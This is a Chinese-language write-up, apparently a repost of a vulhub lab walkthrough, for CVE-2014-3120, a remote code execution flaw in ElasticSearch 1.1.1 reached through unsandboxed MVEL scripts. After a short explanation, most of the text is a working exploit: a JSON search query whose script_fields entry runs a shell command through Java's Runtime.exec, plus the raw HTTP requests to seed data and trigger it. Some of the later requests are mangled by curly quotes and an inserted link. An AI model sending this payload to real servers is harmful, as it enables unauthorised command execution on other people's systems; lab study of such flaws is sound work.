# （CVE-2014-3120）ElasticSearch 命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2902](https://www.zhihuifly.com/t/topic/2902)

# （CVE-2014-3120）ElasticSearch 命令执行漏洞

## 一、漏洞简介

老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。

## 二、漏洞影响

elasticsearch版本：v1.1.1

## 三、复现过程

编译及运行环境：

```
docker-compose build
docker-compose up -d 
```

将Java代码放入json中：

```
{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
  } 
```

首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25 `{

“name”: “phithon”

}` 
```

然后，执行任意代码：

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343 `{

“size”: 1,

“query”: {

“filtered”: {

“query”: {

“match_all”: {

}

}

}

},

“script_fields”: {

“command”: {

“script”: “import [java.io](http://java.io).*;new java.util.Scanner(Runtime.getRuntime().exec(“id”).getInputStream()).useDelimiter(”\\A").next();"

}

}

}` 
```

结果如图：

![image](img/9b42a356565d56b96d1eec001c3dcc38.png)

## 参考链接

> https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/